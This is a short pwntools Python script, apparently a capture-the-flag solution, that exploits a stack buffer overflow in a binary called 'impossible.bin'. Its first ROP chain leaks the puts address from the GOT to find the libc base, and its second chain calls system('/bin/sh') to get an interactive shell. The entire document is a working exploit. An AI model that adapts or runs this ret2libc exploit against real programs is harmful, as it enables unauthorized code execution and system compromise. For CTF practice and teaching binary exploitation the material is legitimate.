from pwn import *

if 'REMOTE' in args:
    p = remote("localhost", 8075)
else:
    p = process("dist/impossible.bin")

context.arch = 'amd64'
e = ELF("dist/impossible.bin")
libc = ELF("dist/libc-2.31.so")

r1 = ROP(e)
r1.read_uint(e.got['puts'])
rop1 = r1.chain()

p.sendlineafter("a >> \n", flat({ 0x28: rop1 }));

puts = u64(p.recvn(6).ljust(8, b"\0"))
libc.address = puts - libc.symbols['puts']
success(f"{ hex(libc.address) = }")

r2 = ROP(libc)
# r2.raw(r2.find_gadget(['ret']))
r2.system(next(libc.search(b"/bin/sh")))
rop2 = r2.chain()

p.sendline(flat({ 0x28: rop2 }));

p.interactive()